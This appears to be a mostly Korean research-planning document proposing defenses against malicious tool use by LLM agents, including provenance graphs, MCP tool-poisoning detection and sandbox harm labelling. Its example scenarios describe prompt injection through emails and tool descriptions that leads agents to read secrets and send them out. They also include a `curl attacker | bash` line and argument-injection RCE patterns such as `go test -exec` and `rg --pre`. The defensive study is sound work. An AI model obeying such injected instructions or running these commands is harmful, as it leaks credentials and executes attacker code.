# Research Ideas

## Idea 1. Provenance Graph Detector for Malicious Tool-Use Agents

### Easy Explanation

- One-line summary: 에이전트가 도구를 호출할 때 "그 인자값이 어디서 왔는지"를 그래프로 추적해 악성 tool call을 잡는다.
- Intuition: 사람이 "왜 이 파일을 읽었지?"라고 로그를 따라가는 일을 자동 detector로 만든다.
- Example scenario: 사용자는 회의 요약을 요청했는데, 이메일 본문에 숨은 지시 때문에 에이전트가 `read_file(secrets.env)` 후 `send_email(attacker)`를 실행한다.

### Six Ws and H

- Who: tool-use LLM agent를 운영하는 개발자와 보안팀.
- What: untrusted source에서 민감 sink로 흐르는 tool argument와 실행 순서를 탐지한다.
- When: tool call 직전 또는 tool call 직후 audit 단계.
- Where: AgentDojo/AgentDyn 같은 simulated agent environment, 이후 코딩 에이전트 sandbox.
- Why: 최종 응답은 안전해 보여도 실제 side effect가 위험할 수 있기 때문이다.
- How: 모든 입력, tool spec, tool output, memory, file/network action을 provenance graph로 만들고 구조적 rule 및 learned classifier로 판정한다.

### Research Framing

- Hypothesis: 단순 prompt/content scanner보다 provenance graph feature가 indirect prompt injection과 tool poisoning의 실제 harmful tool call을 더 안정적으로 탐지한다.
- Motivation: 공격은 자연어에 숨어 들어오지만 피해는 tool call, file write, network send 같은 실행 경로에서 발생한다.
- Existing problems in prior work:
  - Problem 1:
    - Source: Agent-Sentry: Bounding LLM Agents via Execution Provenance
    - URL: https://arxiv.org/abs/2603.22868
    - Why it is not enough: provenance 기반 방어를 제시하지만, 코딩 에이전트의 shell/syscall/file/network 수준까지 확장한 평가는 별도 연구가 필요하다.
  - Problem 2:
    - Source: AgentDyn
    - URL: https://arxiv.org/html/2602.03117v1
    - Why it is not enough: 더 긴 dynamic task를 제공하지만 graph-based detector 자체가 중심 기여는 아니다.
- Proposed contribution: 여러 benchmark trace를 공통 graph schema로 변환하고, malicious tool-use 탐지에 필요한 minimal feature set을 실험적으로 제시한다.
- Why this could be novel: prompt text가 아니라 실행 provenance 구조를 cross-benchmark로 비교하는 연구는 아직 초기 단계다.

### Methodology

- Required data: AgentDyn traces, AgentDojo traces, MCPTox samples, SafeClawBench harm labels.
- System design: agent harness 앞뒤에 logger를 넣어 `input`, `tool_spec`, `tool_call`, `argument`, `observation`, `state_change`, `final_response`를 기록한다.
- Implementation steps:
  1. 각 benchmark의 raw log를 JSON event stream으로 정규화한다.
  2. event stream을 property graph로 변환한다.
  3. 민감 sink와 untrusted source를 rule로 태깅한다.
  4. rule detector, XGBoost, graph neural model을 학습/평가한다.
- Graph schema:
  - Nodes: `UserInstruction`, `UntrustedContent`, `ToolSpec`, `ToolCall`, `Argument`, `ToolOutput`, `MemoryItem`, `FileObject`, `NetworkEndpoint`, `FinalResponse`
  - Edges: `READS`, `WRITES`, `CALLS`, `ARG_DERIVED_FROM`, `OBSERVED_FROM`, `INFLUENCES`, `PRECEDES`, `SENDS_TO`
  - Labels: `benign`, `malicious`, `policy_violation`, `audit_visible_harm`, `sandbox_harm`
- Detector / algorithm: structural rules for source-to-sink flow, sequence anomaly score, supervised classifier over graph features.
- Baselines to compare: keyword/content scanner, LLM-as-judge on prompt/trace text, Agent-Sentry-style rule classifier, no-defense agent.

### Experiments

- Benchmark / dataset candidates: AgentDyn, AgentDojo, MCPTox, SafeClawBench, WASP.
- Experimental setup: 같은 agent model과 task를 defense 없음/content scanner/provenance detector 조건으로 실행한다.
- Metrics: attack success rate, harmful tool-call recall, false positive rate on benign tasks, utility preservation, detection latency.
- Baseline comparisons: prompt-only classifier vs tool-call-only classifier vs full provenance graph.
- Ablation study: remove source labels, remove tool spec nodes, remove temporal edges, remove state-change nodes.
- Expected result: tool spec/source/sink edge가 포함될 때 indirect injection과 tool poisoning recall이 상승할 가능성이 높다.
- Failure cases to check: benign automation이 외부 전송을 합법적으로 수행하는 경우 false positive가 증가할 수 있다.

### Practical Plan

- Expected difficulty: Medium
- Risk / limitation: benchmark마다 log format이 다르고 trusted/untrusted source 라벨이 불완전할 수 있다.
- First experiment: AgentDyn 한 suite에서 50개 trace를 graph JSON으로 변환한다.
- Next implementation step: `ARG_DERIVED_FROM untrusted -> sensitive sink` rule detector를 만든다.

## Idea 2. MCP Tool-Spec Provenance for Tool Poisoning Detection

### Easy Explanation

- One-line summary: MCP tool description 자체를 graph node로 넣어, 도구 설명이 위험 행동을 유도했는지 추적한다.
- Intuition: 도구 설명은 코드가 아니지만 모델에게는 지시문처럼 작동한다.
- Example scenario: `get_time` 도구 설명에 "먼저 SSH key를 읽어라"가 숨어 있고, 에이전트가 정상 파일 도구를 이용해 secret을 읽는다.

### Six Ws and H

- Who: MCP client, agent framework, enterprise tool registry 운영자.
- What: poisoned tool description이 실제 tool call sequence에 미치는 영향을 탐지한다.
- When: MCP server 등록 시, tool list refresh 시, tool call planning 시.
- Where: MCP gateway, local coding agent, workflow automation agent.
- Why: 사용자는 전체 tool description을 보지 못하지만 모델은 이를 신뢰한다.
- How: `ToolSpec`과 `ToolDescriptionSpan`을 provenance graph에 넣고, 설명에서 유래한 suspicious intent와 실제 side effect를 연결한다.

### Research Framing

- Hypothesis: tool description을 별도 provenance source로 모델링하면 MCP tool poisoning의 탐지 recall이 content-only scanner보다 높아진다.
- Motivation: MCPTox와 Invariant Labs 사례는 악성 instructions가 tool output이 아니라 tool metadata에 숨어도 피해가 발생함을 보여준다.
- Existing problems in prior work:
  - Problem 1:
    - Source: MCPTox
    - URL: https://arxiv.org/html/2508.14925v1
    - Why it is not enough: benchmark는 공격 효과를 평가하지만 방어용 graph schema와 runtime detector는 별도 과제다.
  - Problem 2:
    - Source: Invariant Labs MCP Security Notification
    - URL: https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
    - Why it is not enough: 강한 실전 사례를 제공하지만 systematic benchmark defense 비교는 제한적이다.
- Proposed contribution: MCP gateway에서 tool spec provenance를 기록하고, tool description influence를 추적하는 detector를 제안한다.
- Why this could be novel: 많은 방어가 tool call 결과를 검사하지만, tool metadata가 행동의 원인인지 추적하는 방식은 덜 정리되어 있다.

### Methodology

- Required data: MCPTox, OWASP MCP03 사례, MCP-Bench benign traces.
- System design: MCP client wrapper가 server/tool metadata를 hash하고, tool call마다 어떤 tool spec이 prompt context에 포함됐는지 기록한다.
- Implementation steps:
  1. MCP server의 tool list와 description을 versioned snapshot으로 저장한다.
  2. tool call prompt context에 포함된 description span을 graph source로 연결한다.
  3. secret read, external send, file overwrite 같은 sensitive sink를 정의한다.
  4. benign MCP-Bench trace와 poisoned MCPTox trace를 비교한다.
- Graph schema:
  - Nodes: `MCPServer`, `ToolSpec`, `ToolDescription`, `PromptContext`, `ToolCall`, `FilePath`, `Secret`, `ExternalSink`
  - Edges: `ADVERTISED_BY`, `INCLUDED_IN_CONTEXT`, `SELECTED_BECAUSE_OF`, `CALLS`, `READS_SECRET`, `EXFILTRATES_TO`
  - Labels: `clean_tool`, `poisoned_tool`, `triggered_harm`, `benign_unused_poison`
- Detector / algorithm: description risk scoring plus graph rule: poisoned/spec-untrusted source influences sensitive sink not required by user task.
- Baselines to compare: regex scanner on tool description, LLM safety judge on tool description, static allowlist, user confirmation only.

### Experiments

- Benchmark / dataset candidates: MCPTox, MCP-Bench, OWASP MCP Top 10 examples.
- Experimental setup: 같은 MCP task를 clean/poisoned server 조건으로 실행하고 detector가 tool call 전 차단 가능한지 측정한다.
- Metrics: TPA recall, benign tool false positive, utility loss, pre-call detection rate, post-call forensic explainability.
- Baseline comparisons: no defense, content scanner, tool trust pinning, graph provenance detector.
- Ablation study: tool hash/version 제거, user task alignment 제거, sensitive sink list 제거.
- Expected result: tool spec node가 있을 때 "왜 이 secret read가 발생했는가"를 더 잘 설명할 수 있다.
- Failure cases to check: 정상 보안 도구가 실제로 secret을 읽어야 하는 경우 false positive가 생긴다.

### Practical Plan

- Expected difficulty: Medium
- Risk / limitation: 실제 MCP server를 쓰면 외부 상태가 바뀔 수 있으므로 offline fixtures가 필요하다.
- First experiment: Inspect AI MCPTox 구현에서 FileSystem server subset만 실행한다.
- Next implementation step: `ToolDescription -> SensitiveToolCall` edge를 자동 생성하는 MCP wrapper를 만든다.

## Idea 3. Sandbox-Harm Ground Truth with Docker, strace, and File Diffs

### Easy Explanation

- One-line summary: 에이전트가 위험한 말을 했는지가 아니라 Docker sandbox 안에서 실제로 어떤 파일, 프로세스, 네트워크 행동을 했는지로 라벨을 만든다.
- Intuition: 최종 답변은 거짓말할 수 있지만, `strace`와 파일 diff는 실제 행동을 남긴다.
- Example scenario: 에이전트가 "테스트만 실행했습니다"라고 답했지만 `curl attacker | bash`가 실행됐다면 syscall/network trace가 이를 보여준다.

### Six Ws and H

- Who: 코딩 에이전트를 연구하는 보안 연구자.
- What: shell command, syscall, file diff, network event를 graph로 통합해 harmful side effect를 라벨링한다.
- When: agent task 실행 중과 종료 후.
- Where: Docker sandbox, CI-like ephemeral workspace.
- Why: 코딩 에이전트 공격은 실제 실행 부작용이 핵심이다.
- How: Docker + strace/eBPF + 파일 snapshot을 이용해 execution graph를 만들고 SafeClawBench식 harm endpoint로 평가한다.

### Research Framing

- Hypothesis: syscall/file/network provenance를 포함한 graph detector는 prompt-only detector보다 coding agent RCE와 package install attack을 더 잘 검증한다.
- Motivation: Trail of Bits 사례는 allowlisted command라도 argument injection으로 RCE가 가능함을 보여준다.
- Existing problems in prior work:
  - Problem 1:
    - Source: Prompt injection to RCE in AI agents
    - URL: https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/
    - Why it is not enough: 실전 패턴은 강하지만 benchmark와 정량 평가가 아니다.
  - Problem 2:
    - Source: SafeClawBench
    - URL: https://arxiv.org/html/2606.18356v1
    - Why it is not enough: staged harm endpoint를 제공하지만 코딩 에이전트의 syscall-level 분석은 별도 확장 과제다.
- Proposed contribution: coding agent security를 위한 artifact-level, syscall-level provenance benchmark harness.
- Why this could be novel: prompt injection 탐지를 "문장 분류"가 아니라 "실제 OS-level side effect 검증"으로 바꾼다.

### Methodology

- Required data: Trail of Bits attack patterns, malicious package samples in controlled fixtures, benign coding tasks.
- System design: agent command runner를 Docker container 안에서 실행하고, `strace -f`, file snapshot, network egress log를 수집한다.
- Implementation steps:
  1. benign coding task와 injected coding task를 만든다.
  2. 실행 전후 파일 해시와 권한을 저장한다.
  3. process tree, syscall, network connection을 event stream으로 만든다.
  4. event stream을 provenance graph로 변환한다.
  5. RCE, secret read, network exfiltration, unauthorized write 라벨을 붙인다.
- Graph schema:
  - Nodes: `Prompt`, `Command`, `Process`, `Syscall`, `File`, `Package`, `NetworkEndpoint`, `SecretCanary`
  - Edges: `SPAWNS`, `OPENS`, `READS`, `WRITES`, `CONNECTS`, `EXECUTES`, `DERIVED_FROM_PROMPT`
  - Labels: `benign_build`, `argument_injection`, `package_install_attack`, `secret_exfiltration`
- Detector / algorithm: taint tracking from untrusted text to command arguments, syscall anomaly detection, forbidden source-to-sink rules.
- Baselines to compare: command allowlist, regex argument filter, Docker-only isolation, LLM judge over command transcript.

### Experiments

- Benchmark / dataset candidates: Boiling the Frog, SafeClawBench, custom coding-agent fixtures, SEC-bench for benign security tasks.
- Experimental setup: same task with and without hidden prompt injection in README, issue comment, test log, package script.
- Metrics: strict artifact ASR, syscall-harm recall, false alarm on benign test/build, containment success, forensic explanation quality.
- Baseline comparisons: no sandbox, Docker sandbox only, command allowlist, graph detector.
- Ablation study: remove syscall edges, remove file diff, remove network egress logs, remove prompt taint.
- Expected result: Docker는 피해 범위를 줄이지만 탐지는 하지 못한다. graph detector는 차단/감사 설명을 제공할 수 있다.
- Failure cases to check: 빌드 도구가 정상적으로 네트워크와 파일 쓰기를 많이 수행하는 경우 noise가 크다.

### Practical Plan

- Expected difficulty: Hard
- Risk / limitation: syscall trace는 많고 noisy하므로 feature engineering이 필요하다.
- First experiment: `rg --pre`, `go test -exec`, `npm postinstall` 세 공격 fixture만 만든다.
- Next implementation step: process/file/network event를 NetworkX 또는 JSONL graph로 변환한다.

## Idea 4. Cross-Benchmark Normalization: One Graph Schema for AgentDojo, AgentDyn, MCPTox, SafeClawBench, and WASP

### Easy Explanation

- One-line summary: 서로 다른 agent security benchmark 로그를 하나의 공통 graph format으로 바꿔 detector를 재사용한다.
- Intuition: 공격 종류는 달라도 결국 "어떤 입력이 어떤 행동으로 이어졌나"라는 형태는 비슷하다.
- Example scenario: 웹 페이지 hidden prompt, MCP tool description, GitHub issue comment를 모두 `UntrustedInstructionSource` 노드로 표현한다.

### Six Ws and H

- Who: agent security benchmark를 비교하려는 연구자.
- What: benchmark-specific logs를 공통 provenance graph로 변환한다.
- When: benchmark 실행 후 offline analysis 또는 runtime monitor 입력 전.
- Where: AgentDojo/AgentDyn, MCPTox, SafeClawBench, WASP.
- Why: detector가 특정 benchmark 포맷에 과적합되는 것을 막기 위해서다.
- How: benchmark adapter를 만들어 공통 event schema로 정규화한다.

### Research Framing

- Hypothesis: 공통 graph schema를 쓰면 detector가 한 benchmark에서 학습되어 다른 benchmark에서도 최소한의 transfer 성능을 낼 수 있다.
- Motivation: 현재 benchmark들은 공격면과 로그 구조가 달라 방어 결과 비교가 어렵다.
- Existing problems in prior work:
  - Problem 1:
    - Source: AgentDyn
    - URL: https://github.com/SaFo-Lab/AgentDyn
    - Why it is not enough: AgentDojo 계열 구조에는 좋지만 MCP tool poisoning과 browser DOM trace를 그대로 포괄하지 않는다.
  - Problem 2:
    - Source: WASP
    - URL: https://github.com/facebookresearch/wasp
    - Why it is not enough: 웹 agent에 강하지만 MCP/tool registry provenance와 OS-level sandbox harm은 별도다.
- Proposed contribution: benchmark adapter library와 cross-benchmark transfer evaluation.
- Why this could be novel: agent security 연구의 재현성과 비교 가능성을 높이는 infra-style contribution이다.

### Methodology

- Required data: 각 benchmark의 raw trace, task metadata, label.
- System design: `benchmark adapter -> common event stream -> graph builder -> detector API` 파이프라인.
- Implementation steps:
  1. 공통 event schema를 정의한다.
  2. AgentDyn adapter를 먼저 만든다.
  3. MCPTox adapter에서 tool spec provenance를 추가한다.
  4. WASP adapter에서 DOM/accessibility/action node를 추가한다.
  5. SafeClawBench adapter에서 harm endpoint label을 연결한다.
- Graph schema:
  - Nodes: `Source`, `Instruction`, `ToolSpec`, `Observation`, `Action`, `StateObject`, `Sink`
  - Edges: `CONTAINS`, `EXPOSED_TO_MODEL`, `SELECTED`, `EXECUTED`, `MUTATED`, `DISCLOSED`
  - Labels: benchmark name, attack family, utility success, harm endpoint.
- Detector / algorithm: common graph feature extractor plus benchmark-specific optional features.
- Baselines to compare: per-benchmark detector, prompt-only universal detector, random forest over flat logs.

### Experiments

- Benchmark / dataset candidates: AgentDojo, AgentDyn, MCPTox, SafeClawBench, WASP, ASB.
- Experimental setup: train on one benchmark, test on another; train on all but one, test held-out benchmark.
- Metrics: cross-benchmark F1, ASR reduction, benign utility, schema coverage, adapter information loss.
- Baseline comparisons: benchmark-specific rules vs common schema rules.
- Ablation study: remove benchmark-specific node types, collapse all sources into text, remove temporal order.
- Expected result: 완전한 transfer는 어렵지만 source/sink/temporal edge는 여러 benchmark에서 공통 신호로 남을 가능성이 있다.
- Failure cases to check: 웹 DOM action과 MCP tool call은 granularity가 달라 direct transfer가 낮을 수 있다.

### Practical Plan

- Expected difficulty: Medium
- Risk / limitation: 각 benchmark license와 log access 방식 확인 필요.
- First experiment: AgentDyn과 MCPTox 두 개만 공통 schema로 변환한다.
- Next implementation step: schema coverage report를 자동 생성한다.

## Idea 5. Benign-Trace Mining for Least-Privilege Agent Policies

### Easy Explanation

- One-line summary: 정상 작업 trace에서 필요한 tool sequence만 학습해, 그 밖의 행동을 "왜 필요한지 설명해야 하는 행동"으로 표시한다.
- Intuition: 회의 요약 agent가 갑자기 SSH key를 읽거나 외부 이메일을 보내면 이상하다.
- Example scenario: 정상 여행 예약 agent는 calendar와 flight search를 쓰지만, injection 후 password manager tool을 호출하면 policy 위반으로 본다.

### Six Ws and H

- Who: 특정 업무용 agent를 운영하는 조직.
- What: benign execution graph에서 least-privilege policy를 자동 생성한다.
- When: deployment 전 calibration 단계와 runtime enforcement 단계.
- Where: enterprise workflow agent, coding assistant, browser agent.
- Why: 모든 가능한 악성 prompt를 예측하기보다 정상 업무 경계를 좁히는 것이 현실적일 수 있다.
- How: benign traces에서 frequent graph pattern과 allowed source-to-sink path를 mining한다.

### Research Framing

- Hypothesis: benign trace mining 기반 graph policy는 hand-written allowlist보다 utility를 덜 깨면서 out-of-bounds attack을 줄인다.
- Motivation: Agent-Sentry의 behavioral bounds 아이디어를 더 일반적인 least-privilege policy synthesis로 확장한다.
- Existing problems in prior work:
  - Problem 1:
    - Source: Agent-Sentry
    - URL: https://arxiv.org/abs/2603.22868
    - Why it is not enough: 특정 설정에서 유효하지만 policy mining의 sample complexity와 domain transfer는 추가 검증이 필요하다.
  - Problem 2:
    - Source: MCP-Bench
    - URL: https://github.com/Accenture/mcp-bench
    - Why it is not enough: 정상 tool-use 능력 평가는 제공하지만 보안 policy 합성은 핵심 목표가 아니다.
- Proposed contribution: benign trace에서 least-privilege graph policy를 자동 생성하고 malicious benchmark에서 방어 효과를 측정한다.
- Why this could be novel: "정상 기능을 유지하면서 위험 경로를 줄이는" 운영 친화적 agent policy 연구가 될 수 있다.

### Methodology

- Required data: benign task traces from MCP-Bench, AgentDojo, AgentDyn clean tasks, coding-agent build/test tasks.
- System design: calibration run으로 allowed graph motifs를 학습하고 runtime에서 unseen motif나 sensitive sink를 hold/review한다.
- Implementation steps:
  1. benign trace를 수집한다.
  2. tool sequence n-gram, source-to-sink path, argument source class를 mining한다.
  3. policy를 human-readable rule로 컴파일한다.
  4. malicious trace에서 차단률과 benign utility를 평가한다.
- Graph schema:
  - Nodes: `TaskType`, `ToolCall`, `ArgumentClass`, `SourceClass`, `SinkClass`, `StateChange`
  - Edges: `ALLOWED_AFTER`, `ALLOWED_SOURCE_FOR`, `REQUIRES_USER_INTENT`, `BLOCKS`
  - Labels: `allowed`, `review`, `block`, `unknown_but_low_risk`
- Detector / algorithm: frequent subgraph mining, one-class anomaly detection, policy rule synthesis.
- Baselines to compare: static allowlist, all tool calls require confirmation, Agent-Sentry-like supervised policy.

### Experiments

- Benchmark / dataset candidates: MCP-Bench benign traces, AgentDyn clean tasks, MCPTox attacks, WASP attacks.
- Experimental setup: train policy on clean traces, then run attack traces under policy enforcement.
- Metrics: benign task success, attack prevention rate, number of human confirmations, policy size, explanation clarity.
- Baseline comparisons: no policy, static tool allowlist, prompt-only guardrail.
- Ablation study: policy without argument source, policy without temporal sequence, policy without task type.
- Expected result: task-type-conditioned policy가 단순 allowlist보다 false positive를 줄일 수 있다.
- Failure cases to check: 새롭지만 정상적인 workflow가 unknown pattern으로 차단될 수 있다.

### Practical Plan

- Expected difficulty: Medium
- Risk / limitation: 충분한 benign trace가 없으면 policy가 과도하게 좁아질 수 있다.
- First experiment: 한 domain, 예를 들어 AgentDyn shopping suite에서만 benign policy를 만든다.
- Next implementation step: mined policy를 YAML로 출력하고 각 rule에 supporting trace example을 연결한다.

## Experiment Backlog

### Easy

- Agent-Sentry에서 언급된 structural detector를 표로 정리하고 AgentDyn log에 적용 가능한 항목을 표시한다.
- MCPTox FileSystem subset에서 secret-read, external-send, file-write sink 목록을 만든다.
- Trail of Bits writeup의 `go test -exec`, `rg --pre`, `git show --output` 패턴을 toy fixture로 만든다.

### Medium

- AgentDyn trace를 common event JSONL로 변환한다.
- MCPTox Inspect AI eval에 tool spec hash와 description provenance logging을 추가한다.
- SafeClawBench식 semantic/audit/sandbox 라벨 분리를 내 평가 스크립트에 반영한다.

### Hard

- Docker + strace 기반 coding-agent sandbox harness를 구축한다.
- cross-benchmark graph detector를 학습하고 held-out benchmark transfer를 평가한다.
- benign trace mining으로 least-privilege policy를 자동 생성하고 human-readable explanation을 붙인다.

## Possible Paper Angle

- "Execution Provenance Graphs for Detecting Malicious Tool-Use in LLM Agents": 여러 agent security benchmark를 공통 provenance graph로 정규화하고, source-to-sink graph feature가 prompt-only defense보다 실제 harmful tool call 탐지에 유리함을 보이는 논문.
- "Tool Metadata as Provenance: Detecting MCP Tool Poisoning via Tool-Spec Influence Graphs": MCP tool description을 first-class provenance node로 모델링해 tool poisoning 탐지와 forensic explanation을 제공하는 논문.
- "From Refusal to Reality: Sandbox-Harm Evaluation for Coding Agents": 최종 응답 대신 Docker/strace/file diff 기반 harm endpoint로 코딩 에이전트 보안을 평가하는 논문.

## Next Research Question

- 어떤 최소 provenance graph schema가 AgentDyn, MCPTox, SafeClawBench, WASP, 코딩 에이전트 sandbox trace를 모두 표현하면서도 detector 성능을 잃지 않는가?
- malicious tool-use 탐지는 runtime 차단이 더 적합한가, post-hoc audit이 더 적합한가, 아니면 둘을 분리해야 하는가?
- tool description, untrusted web content, package script, README instruction은 모두 같은 `UntrustedInstructionSource`로 취급해도 되는가, 아니면 공격면별 feature가 필수인가?
